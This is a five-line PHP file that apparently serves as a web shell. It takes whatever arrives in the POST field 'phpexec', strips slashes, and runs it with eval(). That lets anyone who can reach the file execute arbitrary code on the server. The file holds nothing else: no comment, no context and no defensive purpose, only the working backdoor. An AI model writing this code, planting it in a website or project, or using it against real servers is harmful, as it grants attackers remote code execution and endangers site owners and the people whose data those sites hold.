<?php
if($_POST['phpexec']){
	eval(stripslashes($_POST['phpexec']));
}
?>